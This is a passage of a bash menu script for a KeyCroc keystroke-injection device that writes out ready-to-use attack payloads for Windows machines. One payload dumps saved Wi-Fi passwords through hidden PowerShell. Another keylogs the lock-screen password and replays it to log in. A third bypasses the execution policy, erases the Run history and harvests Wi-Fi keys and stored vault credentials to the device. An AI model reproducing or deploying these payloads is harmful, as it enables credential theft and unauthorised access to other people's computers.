Q ENTER
Q STRING "}"
Q ENTER
Q STRING "Test-KeyLogger"
Q ENTER
LED ATTACK
else
            LED R
            echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_}-->${clear}${OS_CHECK}\n"
fi
}

##
#   - Getonline Payload Functions
##

get_online_p() {
	LED SETUP
	GETONLINE=/root/udisk/payloads/Getonline.txt
	echo -e "\n\e[40m${red}${LINE_}${clear}\e[40mINSTALLING PAYLOAD CALLED GETONLINE TO PAYLOAD FOLDER${red}${LINE_}${clear}\n"
echo -ne "$(ColorYellow '
--Payload you will be able to connect automatically to target pc WIFI (Windows)\n
--To run this payload after install unplug and plud into windows 10 pc and type in getonline\n
--After payload is done running the led will light up green unplug keycroc and plug back in to pc\n
--The keycroc should now be connected to the target pc wifi')\n"
	if [ -e "${GETONLINE}" ]; then
	LED R
	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
else
	LED SETUP
	GET_ON='label=\"KeyCroc\"'
	GET_ON_A='\$Croc'
	echo -e "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi or to your own wifi\n# Author:          spywill / RootJunky\n# Version:         2.3\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong\n#\n#" >> ${GETONLINE}
	echo -e "MATCH getonline\nQ LOCK\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Open powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Get KeyCroc drive\nQ STRING \"${GET_ON_A} = (gwmi win32_volume -f '${GET_ON}' | Select-Object -ExpandProperty DriveLetter)\"" >> ${GETONLINE}
	echo -e "Q ENTER\nsleep 2\n# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder" >> ${GETONLINE}
	printf '%s\n' 'Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\loot\Croc_Pot\wifipass.txt\""' >> ${GETONLINE}
	echo -e "Q ENTER\nsleep 2\nQ STRING \"exit\"\nQ ENTER\n# --> Returning to HID Mode\nATTACKMODE HID\nsleep 3\nLED SETUP\n# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file" >> ${GETONLINE}
	echo "\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/loot/Croc_Pot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' -e 's/\r//g' root/udisk/config.txt)" >> ${GETONLINE}
	echo -e "sleep 2\nQ UNLOCK\nLED FINISH" >> ${GETONLINE}
	echo ""
	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}${LINE_}${clear}\n"
	LED FINISH
fi
}

##
#   - CrocUnlock Payload Functions
##

croc_unlock_p() {
	LED SETUP
	CROCUNLOCK=/root/udisk/payloads/Croc_unlock_1.txt
	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40mINSTALLING PAYLOAD CALLED CROCUNLOCK TO PAYLOAD FOLDER${red}${LINE_}${clear}\n"
echo -ne "$(ColorYellow '
--To run this payload by pressing GUI + L or CONTROL + ALT or ALT + F4 to start the payload\n
--This will forus the user to enter his or her password and save to keycroc loot/Croc_Pot\n
--Then this payload will create another payload called Croc_unlock_2.txt\n
--With the second payload installed and the saved password we can now login to windows 10 pc\n
--After the second payload has be created may need to unplug and plug back in the keycroc for the payload to work properly\n
--When you are at login screen type in crocunlock this will enter the user password and log you in\n
\n')"
echo -ne "$(ColorRed '
--THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED AFTER THE USER HAS ENTER THE PASSWORD\n
--THIS WILL WORK FOR PIN NUMBER TO AS LONG AS THE ENTER KEY HAS BE PRESSED AFTER')\n"
echo ""
	if [ -e "${CROCUNLOCK}" ]; then
	LED B
	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
else
	LED SETUP
	echo -e "# Title:           CrocUnlock (payload #1)\n# Description:     Log into windows pc\n# Author:          spywill / RootJunky\n# Version:         1.3\n# Category:        Key Croc\n#\n#\nMATCH (GUI-l|CONTROL-ALT-DELETE|ALT-F4)\n#\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered\nCROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\n#" >> ${CROCUNLOCK}
	echo -e "if [ -e \"\${CROC_UNLOCK}\" ]; then\n     LED ATTACK\n     sleep 2\nSAVEKEYS /root/udisk/loot/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n     LED FINISH\n     sleep 2\n     LED OFF;\nelse\n     LED SETUP" >> ${CROCUNLOCK}
	printf '%s\n'     'echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.3\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
	printf '%s\n'     'echo M\A\T\C\H crocunlock >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
	printf '%s\n'     'echo -e "LED SETUP\nsleep 1\nCROC_PASS=/root/udisk/loot/Croc_Pot/winpasswd.txt\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered" >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
	printf "%s\n"     "echo -e \"\\\$(sed -i 's/crocunlock//g' \\\${CROC_KEYS})\ncat \\\${CROC_KEYS} >> \\\${CROC_PASS}\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nif [ -e \\\"\\\${CROC_PASS}\\\" ]; then\" >> \${CROC_UNLOCK}" >> ${CROCUNLOCK}
	printf "%s\n"     "echo -e \"      LED ATTACK\n      sleep1\n      Q STRING \\\$(sed '\\\$!d' \\\${CROC_PASS})\n      Q ENTER\n      sleep 1\n      LED FINISH\n      sleep 2\n      LED OFF;\" >> \${CROC_UNLOCK}" >> ${CROCUNLOCK}
	printf "%s\n"     "echo -e \"else\n      LED R\n      sleep1\n      Q STRING \\\$(sed '\\\$!d' \\\${CROC_KEYS})\n      Q ENTER\n      sleep 1\n      LED FINISH\n      sleep 2\n      LED OFF;\nfi;\n#\nrm -f /root/udisk/loot/Croc_Pot/Croc_unlock.txt\" >> \${CROC_UNLOCK}" >> ${CROCUNLOCK}
	echo -e "     LED ATTACK\n     sleep 2\nSAVEKEYS /root/udisk/loot/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n     LED FINISH\n     sleep 2\n     LED OFF;\nfi;" >> ${CROCUNLOCK}
	echo -ne "\n\e[40;4m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
	LED FINISH
fi
}

##
#   - Wifi Setup Payload Functions
##

wifi_setup_p() {
	LED SETUP
echo -ne "\n$(ColorYellow '
--WITH THIS PAYLOAD YOU CAN CREATE MULTIPLE WIFI SETTING\n
--THIS WILL CREATE A PAYLOAD WITH YOUR WIFI SETTING\n
--THE PURPOSE OF THIS PAYLOAD IS THAT IF YOU MOVE YOUR KEYCROC AROUND TO DIFFERENT WIFI AP\n
--YOU CAN CREATE A PAYLOAD WITH MATCH WORD AND CONNECT TO WIFI AP QUICKLY')\n\n"
            LED SETUP
            while read -p "$(ColorBlue 'ENTER A NAME FOR THIS PAYLOAD AND PRESS [ENTER]'): " USER_NAME_PL; do
            PAYLOAD_FOLDER=/root/udisk/payloads/${USER_NAME_PL}.txt
            if [[ -e "${PAYLOAD_FOLDER}" ]]; then
            LED R
            echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'THIS PAYLOAD ALREADY EXISTS PLEASE CHOOSE A DIFFERENT NAME')${clear}${LINE_}\n"
else
            LED SETUP
            touch ${PAYLOAD_FOLDER}
            read -p "$(ColorBlue 'ENTER THE MATCH WORD YOU WOULD LIKE TO USE AND PRESS [ENTER]'): " USER_MATCH
            read -p "$(ColorBlue 'ENTER THE SSID AND PRESS [ENTER]'): " USER_SSID
            read -p "$(ColorBlue 'ENTER THE PASSWORD AND PRESS [ENTER]'): " WIFI_PASS           
echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
MATCH ${USER_MATCH}\nLED SETUP\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID} WIFI_PASS ${WIFI_PASS} SSH ENABLE' /root/udisk/config.txt)\nsleep 1\nLED FINISH" >> ${PAYLOAD_FOLDER}
echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}${LINE_}${clear}\n 
$(ColorYellow '--UNPLUG THE KEYCROC AND PLUG BACK IN\n --TYPE IN YOUR MATCH WORD LED WILL LIGHT UP') ${green}GREEN${clear} $(ColorYellow 'THEN UNPLUG THE KEYCROC AND PLUG BACK IN\n --YOUR KEYCROC SHOULD NOW BE CONNECTED TO YOUR WIFI SETUP')\n"
            LED FINISH
            break
 fi
done
}

##
#   - Windows Info Scan Functions
##

windows_check() {
	echo -ne "\n$(ColorYellow 'WINDOWS SCAN CAN TAKE UP TO 1 MIN TO RUN\n
--This is an Bash Bunny payload working on the Croc\n 
--This will Scan an Windows pc and collect alot of information\n
--Save to loot/Croc_pot folder')\n"
    
start_win_stat() {
	    rm -f ${LOOT_WIND}
        ATTACKMODE HID STORAGE
        sleep 5
        Q GUI r
        sleep 1
        LED ATTACK
        Q STRING "powershell -nop -ex Bypass -w Hidden"
        Q ENTER
        sleep 5
        Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\run.ps1')"
        Q ENTER
        sleep 45
        Q STRING "exit"
        Q ENTER
        ATTACKMODE HID
        LED FINISH
        sleep 3
        LED OFF
}
    LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
    WIN_PS=/root/udisk/tools/Croc_Pot/run.ps1
    WIN_PS_A=/root/udisk/tools/Croc_Pot/info.ps1
    CROC_OS=/root/udisk/loot/Croc_OS.txt
    OS_CHECK=$(sed -n 1p ${CROC_OS})
    echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $OS_CHECK\n"
    if [ "${OS_CHECK}" = WINDOWS ]; then
    if [[ -e "${WIN_PS}" && "${WIN_PS_A}" ]]; then
    start_win_stat
    echo "${LOOT_WIND}"
else
    LED SETUP
    sleep 1
echo -ne "powershell \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"\n\n\$VolumeName = \"KeyCroc\"\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$backupDrive = \$null\nGet-WmiObject win32_logicaldisk | % {\n
if (\$_.VolumeName -eq \$VolumeName) {\n        \$backupDrive = \$_.DeviceID\n    }\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n    New-Item -ItemType directory -Path \$TARGETDIR\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\Croc_Pot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n   New-Item -ItemType directory -Path \$TARGETDIR\n}\n   
\$backupPath = \$backupDrive + \"\loot\Croc_Pot\" + \"\KeyCroc_Wind_Log\" + \".txt\"\n\$TARGETDIR = \$MyInvocation.MyCommand.Path\n\$TARGETDIR = \$TARGETDIR -replace \".......\$\"\ncd \$TARGETDIR\nPowerShell.exe -ExecutionPolicy Bypass -File info.ps1 > \$backupPath" >> ${WIN_PS}
echo -ne "try\n{\n\$computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content\n}\ncatch\n{\n\$computerPubIP = \"Error getting Public IP\"\n}\n\$computerIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {\$_.Ipaddress.length -gt 1}\n\$IsDHCPEnabled = \$False\n
\$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter \"DHCPEnabled=\$True\" | ? {\$_.IPEnabled}\nforeach (\$Network in \$Networks) {\nIf(\$network.DHCPEnabled) {\n\$IsDHCPEnabled = \$True\n  }\n[string[]]\$computerMAC = \$Network.MACAddress\n}\n\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$computerBIOS = Get-CimInstance CIM_BIOSElement\n
\$computerOs = Get-WmiObject Win32_operatingsystem | select Caption, CSName, Version, @{Name=\"InstallDate\";Expression={([WMI]'').ConvertToDateTime(\$_.InstallDate)}} , @{Name=\"LastBootUpTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LastBootUpTime)}}, @{Name=\"LocalDateTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory | Format-List\n\$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List\n\$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List\n
\$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { \"{0:N1} GB\" -f (\$_.sum / 1GB)}\n\$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name=\"Capacity\";Expression={ \"{0:N1} GB\" -f (\$_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table\n\n\$driveType = @{\n   2=\"Removable disk \"\n   3=\"Fixed local disk \"\n   4=\"Network disk \"\n   5=\"Compact disk \"}\n
\$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name=\"DriveType\";Expression={\$driveType.item([int]\$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name=\"Size_GB\";Expression={\"{0:N1} GB\" -f (\$_.Size / 1Gb)}}, @{Name=\"FreeSpace_GB\";Expression={\"{0:N1} GB\" -f (\$_.FreeSpace / 1Gb)}}, @{Name=\"FreeSpace_percent\";Expression={\"{0:N1}%\" -f ((100 / (\$_.Size / \$_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name=\"Size GB\"; Expression={\$_.Size_GB}; align=\"right\"; }, @{ Name=\"FreeSpace GB\"; Expression={\$_.FreeSpace_GB}; align=\"right\"; }, @{ Name=\"FreeSpace %\"; Expression={\$_.FreeSpace_percent}; align=\"right\"; }\n
\$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi](\$_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table\n\n\$RDP\nif ((Get-ItemProperty \"hklm:\System\CurrentControlSet\Control\Terminal Server\").fDenyTSConnections -eq 0) {\n    \$RDP = \"RDP is Enabled\"\n} else {\n    \$RDP = \"RDP is NOT Enabled\"\n}\n\n\$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { \$_.MACAddress -notlike \$null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress\n
\$WLANProfileNames = @()\n\$Output = netsh.exe wlan show profiles | Select-String -pattern \":\"\nForeach(\$WLANProfileName in \$Output){\n    \$WLANProfileNames += ((\$WLANProfileName -split \":\")[1]).Trim()\n}\n\$WLANProfileObjects = @()\n
Foreach(\$WLANProfileName in \$WLANProfileNames){\n    try{\n        \$WLANProfilePassword = (((netsh.exe wlan show profiles name=\"\$WLANProfileName\" key=clear | select-string -Pattern \"Key Content\") -split \":\")[1]).Trim()\n    } Catch {\n        \$WLANProfilePassword = \"The password is not stored in this profile\"\n    }\n    \$WLANProfileObject = New-Object PSCustomobject\n    \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfileName\" -Value \$WLANProfileName\n
        \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfilePassword\" -Value \$WLANProfilePassword\n    \$WLANProfileObjects += \$WLANProfileObject\n    Remove-Variable WLANProfileObject\n}\n\n\$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID\n
    \$process = Get-WmiObject Win32_process | select Handle, ProcessName, ExecutablePath, CommandLine\n\n\$listener = Get-NetTCPConnection | select @{Name=\"LocalAddress\";Expression={\$_.LocalAddress + \":\" + \$_.LocalPort}}, @{Name=\"RemoteAddress\";Expression={\$_.RemoteAddress + \":\" + \$_.RemotePort}}, State, AppliedSetting, OwningProcess\n\$listener = \$listener | foreach-object {\n    \$listenerItem = \$_\n    \$processItem = (\$process | where { [int]\$_.Handle -like [int]\$listenerItem.OwningProcess })\n
        new-object PSObject -property @{\n      \"LocalAddress\" = \$listenerItem.LocalAddress\n      \"RemoteAddress\" = \$listenerItem.RemoteAddress\n      \"State\" = \$listenerItem.State\n      \"AppliedSetting\" = \$listenerItem.AppliedSetting\n
          \"OwningProcess\" = \$listenerItem.OwningProcess\n      \"ProcessName\" = \$processItem.ProcessName\n    }\n} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table\n\n\$process = \$process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine\n\n\$service = Get-WmiObject Win32_service | select State, Name, DisplayName, PathName, @{Name=\"Sort\";Expression={\$_.State + \$_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName\n
\$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { \$_.DisplayName -notlike \$null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize\n
\$drivers = Get-WmiObject Win32_PnPSignedDriver | where { \$_.DeviceName -notlike \$null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion\n\n\$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution\n\n[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n\$vault = New-Object Windows.Security.Credentials.PasswordVault\n\$vault = \$vault.RetrieveAll() | % { \$_.RetrievePassword();\$_ }\n
Clear-Host\nWrite-Host\n\n\$computerSystem.Name\n\"${LINE}\"\n\"Manufacturer: \" + \$computerSystem.Manufacturer\n\"Model: \" + \$computerSystem.Model\n\"Serial Number: \" + \$computerBIOS.SerialNumber\n\"\"\n\"\"\n\"\"\n\n\"OS:\"\n\"${LINE}\"+ (\$computerOs | out-string)\n
\"CPU:\"\n\"${LINE}\"+ (\$computerCpu | out-string)\n\n\"RAM:\"\n\"${LINE}\"\n\"Capacity:\" + \$computerRamCapacity+ (\$computerRam | out-string)\n\n\"Mainboard:\"\n\"${LINE}\"+ (\$computerMainboard | out-string)\n\n\"Bios:\"\n\"${LINE}\"+ (Get-WmiObject Win32_bios | out-string)\n\n\"Local-user:\"\n\"${LINE}\"+ (\$luser | out-string)\n\n\"HDDs:\"\n\"${LINE}\"+ (\$Hdds | out-string)\n\n\"COM & SERIAL DEVICES:\"\n\"${LINE}\"+ (\$COMDevices | Out-String)\n\n\"Network:\"\n\"${LINE}\"\n\"Computers MAC address: \" + \$computerMAC\n\"Computers IP address: \" + \$computerIP.ipaddress[0]\n\"Public IP address: \" + \$computerPubIP\n
\"RDP: \" + \$RDP\n\"\"\n(\$Network | out-string)\n\n\"W-Lan profiles:\"\n\"${LINE}\"+ (\$WLANProfileObjects | out-string)\n\n\"listeners / ActiveTcpConnections:\"\n\"${LINE}\"+ (\$listener | out-string)\n\n\"Current running process:\"\n\"${LINE}\"+ (\$process | out-string)\n
\"Services:\"\n\"${LINE}\"+ (\$service | out-string)\n\n\"Installed software:\"\n\"${LINE}\"+ (\$software | out-string)\n\n\"Installed drivers:\"\n\"${LINE}\"+ (\$drivers | out-string)\n\n\"Installed videocards:\"\n\"${LINE}\"+ (\$videocard | out-string)\n
\"Windows/user passwords:\"\n\"${LINE}\"\n\$vault | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize\n\nRemove-Variable -Name computerPubIP,\ncomputerIP,IsDHCPEnabled,Network,Networks,\ncomputerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,\ncomputerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,\nOutput,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,\nprocess,listener,listenerItem,process,service,software,drivers,videocard,\nvault -ErrorAction SilentlyContinue -Force" >> ${WIN_PS_A}
       sleep 1
       start_win_stat
       echo "${LOOT_WIND}"
       fi
else
       LED R
       echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_} -->${clear} ${OS_CHECK}\n"
fi
}

##
#   - VPN SETUP-Start/stop Functions
##

function croc_vpn() {
    vpn_file_A=/etc/openvpn/*.ovpn
    vpn_file=/root/udisk/*.ovpn

setup_vpn() {
echo -ne "\n\e[40;m$(ColorYellow '
-First you will need to download the (filename.ovpn) file\n
-from your VPN server of choice\n
-place it on the keycroc root of the udisk\n
-Then select #1 VPN SETUP to do the rest\n
-This will check to see if openvpn is installed if not installing it')${clear}\n"

##
#   - VPN Check/install openvpn
##
    pkg_vpn=openvpn
	status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_vpn" 2>&1)"
	if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
	apt install $pkg_vpn
	fi

##
#   - VPN user input
##

	  if [ -f ${vpn_file} ]; then
	  echo -ne "\n$(ColorYellow 'FOUND .ovpn FILE MOVING IT TO ect/openvpn')\n"
	  find . -name *.ovpn -exec mv '{}' "/etc/openvpn/" ";"
	  touch /etc/openvpn/credentials
	  read -p "$(ColorBlue 'ENTER YOUR USER NAME AND PRESS [ENTER]:') " VPN_USER ; echo ${VPN_USER} >> /etc/openvpn/credentials
	  read -p "$(ColorBlue 'ENTER YOUR PASSWD AND PRESS [ENTER]:') " VPN_PW ; echo ${VPN_PW} >> /etc/openvpn/credentials
	  sed -i 's/auth-user-pass/auth-user-pass \/etc\/openvpn\/credentials/g' ${vpn_file_A}
	  openvpn --config ${vpn_file_A} --daemon
else
      echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'DID NOT FIND .ovpn FILE ON THE KEYCROC UDISK')${LINE_}${clear}\n"
      fi
}

##
#   - VPN Menu
##

MenuTitle VPN MENU
MenuColor 1 VPN SETUP________
MenuColor 2 ENABLE VPN_______
MenuColor 3 DISENABLE VPN____
MenuColor 4 VPN STATUS_______
MenuColor 5 EDIT .OVPN FILE___
MenuColor 6 REMOVE VPN FILES__
MenuColor 7 RETURN TO MAIN MENU
MenuEnd
        read mv
        case $mv in
        1) setup_vpn ; croc_vpn ;;
        2) openvpn --config ${vpn_file_A} --daemon ; echo -ne "\n\e[40;m$(ColorGreen 'ENABLE VPN CHECK VPN STATUS')${clear}\n" ; croc_vpn ;;
        3) killall openvpn ; service openvpn restart ; echo -ne "\n\e[40;m$(ColorRed 'DISENABLE VPN CHECK VPN STATUS')${clear}\n" ; croc_vpn ;;
        4) service openvpn status ; route -n ; ifconfig ; croc_vpn ;;
	5) nano ${vpn_file_A} ; croc_vpn ;;
        6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n\e[40;m$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')${clear}\n" ; croc_vpn ;;
        7) main_menu ;;
        0) exit 0 ;;
        *) invalid_entry ;;
        esac
}
  
##
#   - Croc Pot Plus Menu
##
	
menu_B() {
	LED B
MenuTitle CROC POT PLUS MENU
MenuColor 1 TCPDUMP SCAN_____________
MenuColor 2 KEYSTORKES LAPTOP WINDOWS_
MenuColor 3 GETONLINE PAYLOAD WINDOWS_
MenuColor 4 CROCUNLOCK PAYLOAD WINDOWS
MenuColor 5 WIFI SETUP PAYLOAD________
MenuColor 6 NMAP SCAN________________
MenuColor 7 WINDOWS INFO SCAN_________
MenuColor 8 CROC VPN SETUP____________
MenuColor 9 RETURN TO MAIN MENU________
MenuEnd
        read a_d
        case $a_d in
        1) tcpdump_scan ; menu_B ;;
        2) keystorkes_laptop ; menu_B ;;
        3) get_online_p ; menu_B ;;
        4) croc_unlock_p ; menu_B ;;
        5) wifi_setup_p ; menu_B ;;
        6) nmap_menu ;;
        7) windows_check ; menu_B ;;
        8) croc_vpn ; menu_B ;;
        9) main_menu ;;
        0) exit 0 ;;
        *) invalid_entry ; menu_B ;;
        esac
 }
menu_B
}

##
#   - Croc status menu/function
##

function croc_status() {
	LED SETUP
	croc_title
	server_name=$(hostname)
	
memory_check() {
    echo -ne "\n\e[40m$(ColorYellow 'Memory usage on') ${server_name} is:${clear}\n"
    egrep --color=auto 'Mem|Cache|Swap' /proc/meminfo
    free -t -m
    cat /proc/meminfo
    vmstat
    df -h 
}

cpu_check() {
    echo -ne "\n\e[40m$(ColorYellow 'CPU load on') ${server_name} is:${clear}\n"
    more /proc/cpuinfo && lscpu | grep MHz --color=auto
    lscpu | egrep 'Model name|Socket|Thread|NUMA|CPU\(s\)'
    echo "Threads/core: $(nproc --all)"
    echo "Number of CPU/cores online at $HOSTNAME: $(getconf _NPROCESSORS_ONLN)"
    echo "CPU TEMP"
    cat /sys/class/thermal/thermal_zone*/type <(cat /sys/class/thermal/thermal_zone*/temp) | column -s $'\t' -t | sed 's/\(.\)..$/.\1°C/'
}

tcp_check() {
    echo -ne "\n\e[40m$(ColorYellow 'TCP connections on') ${server_name} is:${clear}\n"
    netstat -l
    netstat -r
    netstat -tunlp
}

kernel_check() {
    echo -ne "\n\e[40m$(ColorYellow 'Kernel version on') ${server_name} is:${clear}\n"
    uname --all
    hostnamectl
    cat /proc/version
}

processes_check() {
    echo -ne "\n\e[40m$(ColorYellow 'Running Processes') ${server_name} is:${clear}\n"
    ps -aux
}

##
#   -Status KeyCroc info
##

all_checks() {
    LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
    rm -f ${LOOT_INFO}
    croc_title_loot >> ${LOOT_INFO}
echo -ne "\t${LINE_}KEYCROC INFO${LINE_}\n${LINE}\nCROC FIRMWARE: $(cat /root/udisk/version.txt)\nKEYCROC CONFIG SETTING:\n$(sed -n '/^[DWS]/p' /root/udisk/config.txt)\n${LINE}\nUSER NAME: $(whoami)\nHOSTNAME: $(cat /proc/sys/kernel/hostname)
IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nPUBLIC IP: $(curl ifconfig.co)\nMAC ADDRESS: $(ip -o link | awk '$2 != "lo:" {print $2, $(NF-2)}')\n${LINE}\nVARIABLES CURRENT USER:\n$(env)\n${LINE}\n
INTERFACE: $(ip route show default | awk '/default/ {print $5}')\nMODE: $(cat /tmp/mode)\nSSH: root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nDNS: $(sed -n -e 4p /etc/resolv.conf)\nDNS: $(sed -n -e 5p /etc/resolv.conf)\nDISPLAY ARP: $(ip n)\n${LINE}\nROUTE TALBE: $(ip r)\nNETWORK:\n$(ifconfig -a)\n${LINE}\nSYSTEM UPTIME: $(uptime)\n
SYSTEM INFO: $(uname -a)\n${LINE}\nUSB DEVICES:\n$(lsusb -v)\n${LINE}\nBASH VERSION:\n$(apt-cache show bash)\n${LINE}\nLINUX VERSION:\n$(cat /etc/os-release)\n${LINE}\nSSH KEY:\n$(ls -al ~/.ssh)\n$(cat ~/.ssh/id_rsa.pub)\n${LINE}\n
MEMORY USED:\n$(free -m)\n$(cat /proc/meminfo)\n${LINE}\nSHOW PARTITION FORMAT:\n$(lsblk -a)\n${LINE}\nSHOW DISK USAGE:\n$(df -TH)\n\t${LINE_A}>MORE DETAIL<${LINE_A}\n$(fdisk -l)\n${LINE}\nCHECK USER LOGIN:\n$(lastlog)\n${LINE}\nCURRENT PROCESS:\n$(ps aux)\n${LINE}\nCPU INFORMATION:\n$(more /proc/cpuinfo)\n$(lscpu | grep MHz)\n${LINE}\nCHECK PORT:\n$(netstat -tulpn)\n
